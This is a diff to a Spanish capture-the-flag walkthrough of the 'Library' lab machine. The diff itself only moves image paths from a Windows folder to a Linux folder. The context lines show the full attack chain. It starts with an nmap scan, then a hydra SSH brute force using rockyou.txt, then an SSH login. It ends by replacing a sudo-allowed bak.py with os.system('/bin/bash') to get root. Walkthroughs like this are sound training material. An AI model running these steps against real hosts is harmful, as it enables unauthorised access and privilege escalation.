@@ -40,7 +40,7 @@ Se ejecuta el siguiente comando:
 ```bash
 nmap -sC -sV -A -O 10.114.169.81
 ```
-![nmap](Maquinas_de_Windows/Library/imagenes/nmap.png)
+![nmap](Maquina_de_Linux/Library/imagenes/nmap.png)
 
 Los parámetros utilizados permiten obtener información detallada del sistema:
 
@@ -69,7 +69,7 @@ Al cargar la página se muestra un sitio web con el título:
 ```bash
 Welcome to Blog - Library Machine
 ```
-![pagina](Maquinas_de_Windows/Library/imagenes/pagina.png)
+![pagina](Maquina_de_Linux/Library/imagenes/pagina.png)
 
 Se trata de un blog sencillo relacionado con una biblioteca. Aunque la página es simple, proporciona un punto de partida para continuar con la fase de enumeración del servidor web.
 
@@ -90,7 +90,7 @@ Para revisarlo se accede a la siguiente ruta desde el navegador:
 ```bash
 http://10.114.169.81/robots.txt
 ```
-![robots](Maquinas_de_Windows/Library/imagenes/robots.png)
+![robots](Maquina_de_Linux/Library/imagenes/robots.png)
 
 El archivo muestra las rutas que el administrador del sitio ha marcado como no indexables por los buscadores. Sin embargo, en un proceso de enumeración de seguridad, estos archivos pueden revelar directorios o información interesante sobre la estructura del sitio web.
 
@@ -107,7 +107,7 @@ El comando utilizado es el siguiente:
 ```bash
 hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.114.169.81
 ```
-![hydra](Maquinas_de_Windows/Library/imagenes/hydra.png)
+![hydra](Maquina_de_Linux/Library/imagenes/hydra.png)
 
 Explicación de los parámetros utilizados:
 
@@ -132,7 +132,7 @@ El comando utilizado es el siguiente:
 ```bash
 ssh meliodas@10.114.169.81
 ```
-![ssh](Maquinas_de_Windows/Library/imagenes/ssh.png)
+![ssh](Maquina_de_Linux/Library/imagenes/ssh.png)
 
 El sistema solicita la contraseña del usuario. Introducimos la contraseña obtenida anteriormente con Hydra:
 
@@ -158,7 +158,7 @@ Esto indica que el usuario meliodas puede ejecutar el archivo:
 ```bash
 /home/meliodas/bak.py
 ```
-![sudo](Maquinas_de_Windows/Library/imagenes/sudo.png)
+![sudo](Maquina_de_Linux/Library/imagenes/sudo.png)
 
 utilizando Python con privilegios de root, y además sin necesidad de introducir contraseña (NOPASSWD).
 
@@ -185,7 +185,7 @@ Después se crea uno nuevo:
 ```bash
 nano bak.py
 ```
-![bak](Maquinas_de_Windows/Library/imagenes/bak.png)
+![bak](Maquina_de_Linux/Library/imagenes/bak.png)
 
 Dentro del archivo se añade el siguiente código:
 
@@ -193,7 +193,7 @@ Dentro del archivo se añade el siguiente código:
 import os
 os.system("/bin/bash")
 ```
-![scripts](Maquinas_de_Windows/Library/imagenes/archivo.png)
+![scripts](Maquina_de_Linux/Library/imagenes/archivo.png)
 
 Este código ejecuta una shell del sistema.
 
@@ -226,6 +226,6 @@ Si la escalada de privilegios ha sido exitosa, el resultado será:
 ```bash
 root
 ```
-![root](Maquinas_de_Windows/Library/imagenes/root.png)
+![root](Maquina_de_Linux/Library/imagenes/root.png)
 
 Esto confirma que se ha conseguido acceso completo al sistema.
